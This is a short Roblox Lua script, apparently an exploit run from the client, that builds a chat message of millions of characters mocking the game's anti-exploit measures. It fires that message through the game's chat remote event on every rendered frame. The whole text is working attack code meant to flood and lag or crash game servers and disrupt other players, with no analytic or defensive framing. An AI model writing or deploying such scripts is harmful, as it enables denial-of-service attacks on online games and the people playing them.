local msg = "/e "..string.rep("GET BETTER ANTI-EXPLOIT MAYBE?        ",301056)
game:GetService("RunService").RenderStepped:Connect(function()
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
end)